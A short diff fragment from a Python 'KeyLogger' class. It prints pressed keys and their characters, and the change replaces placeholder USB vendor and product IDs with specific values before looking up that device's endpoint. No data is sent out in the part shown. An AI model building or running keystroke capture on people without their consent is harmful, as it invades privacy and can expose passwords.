@@ -91,8 +91,8 @@ class KeyLogger:
                     char = "Not FOUND"
                 print(f"Key pressed: {key_code} ({char})")
                 try:
-                    id_vendor = 0x00000
-                    device_id = 0x00000
+                    id_vendor = 0x247d
+                    device_id = 0xc53a
                     device = usb.core.find(idVendor=id_vendor, idProduct=device_id)
                     if device:
                         endpoint = device[0][(0, 0)][0]
